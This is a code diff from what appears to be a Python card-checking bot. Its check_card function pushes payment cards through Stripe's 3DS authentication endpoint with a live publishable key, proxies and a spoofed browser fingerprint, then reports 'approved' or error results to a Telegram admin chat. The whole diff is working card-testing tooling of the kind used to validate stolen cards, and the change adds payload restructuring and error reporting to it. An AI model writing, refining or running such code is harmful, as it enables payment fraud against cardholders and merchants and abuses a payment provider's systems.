@@ -351,26 +351,79 @@ async def check_card(card, bot_app, auth_cookies):
         
         if 'next_action' in result:
             print(f"[✓] Has next_action - proceeding to 3DS...")
-            source = result['next_action']['use_stripe_sdk']['three_d_secure_2_source']
             
-            auth_data = f'source={source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F141.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn'
+            # فحص نوع الـ next_action
+            next_action_type = result['next_action'].get('type')
+            print(f"[📊] Next action type: {next_action_type}")
             
-            print(f"[📡] Sending 3DS authentication...")
-            auth_response = session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=auth_data, proxies=proxies, timeout=30)
-            print(f"[✓] 3DS Response Code: {auth_response.status_code}")
-            
-            auth_result = auth_response.json()
-            
-            # 🔥 حفظ الـ 3DS Response
-            auth_file = f"bot_3ds_{card_number[:6]}.json"
-            with open(auth_file, "w") as f:
-                json.dump(auth_result, f, indent=2)
-            print(f"[💾] 3DS Response saved to: {auth_file}")
-            
-            print(f"[📊] 3DS Response keys: {list(auth_result.keys())}")
-            
-            trans_status = auth_result.get('ares', {}).get('transStatus', 'Unknown')
-            print(f"[🎯] Transaction Status: {trans_status}")
+            if next_action_type == 'use_stripe_sdk' and 'three_d_secure_2_source' in result['next_action'].get('use_stripe_sdk', {}):
+                source = result['next_action']['use_stripe_sdk']['three_d_secure_2_source']
+                print(f"[✓] Source extracted: {source[:30]}...")
+                
+                # 🔥 تبسيط الـ auth_data
+                auth_data = {
+                    'source': source,
+                    'browser': json.dumps({
+                        "fingerprintAttempted": False,
+                        "fingerprintData": None,
+                        "challengeWindowSize": None,
+                        "threeDSCompInd": "Y",
+                        "browserJavaEnabled": False,
+                        "browserJavascriptEnabled": True,
+                        "browserLanguage": "en-US",
+                        "browserColorDepth": "24",
+                        "browserScreenHeight": "1080",
+                        "browserScreenWidth": "1920",
+                        "browserTZ": "-180",
+                        "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
+                    }),
+                    'one_click_authn_device_support[hosted]': 'false',
+                    'one_click_authn_device_support[same_origin_frame]': 'false',
+                    'one_click_authn_device_support[spc_eligible]': 'false',
+                    'one_click_authn_device_support[webauthn_eligible]': 'false',
+                    'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
+                    'key': 'pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn'
+                }
+                
+                print(f"[📡] Sending 3DS authentication...")
+                auth_response = session.post(
+                    'https://api.stripe.com/v1/3ds2/authenticate',
+                    headers=headers,
+                    data=auth_data,
+                    proxies=proxies,
+                    timeout=30
+                )
+                print(f"[✓] 3DS Response Code: {auth_response.status_code}")
+                
+                auth_result = auth_response.json()
+                print(f"[📊] 3DS Response keys: {list(auth_result.keys())}")
+                
+                # فحص وجود error
+                if 'error' in auth_result:
+                    error_msg = auth_result['error'].get('message', 'Unknown')
+                    print(f"[❌] 3DS Error: {error_msg}")
+                    
+                    # Debug للأدمن
+                    debug_text = (
+                        f"⚠️ **3DS Authentication Error**\n\n"
+                        f"💳 Card: `{card_number[:6]}****{card_number[-4:]}`\n"
+                        f"❌ Error: `{error_msg}`\n\n"
+                        f"📄 Response:\n```json\n{json.dumps(auth_result, indent=2)[:2000]}\n```"
+                    )
+                    try:
+                        await bot_app.bot.send_message(chat_id=stats['chat_id'], text=debug_text, parse_mode='Markdown')
+                    except:
+                        pass
+                    
+                    stats['errors'] += 1
+                    stats['checking'] -= 1
+                    stats['last_response'] = f'3DS Error'
+                    await update_dashboard(bot_app)
+                    session.close()
+                    return card, "ERROR", error_msg
+                
+                trans_status = auth_result.get('ares', {}).get('transStatus', 'Unknown')
+                print(f"[🎯] Transaction Status: {trans_status}")
             
             if trans_status == 'N':
                 stats['approved'] += 1
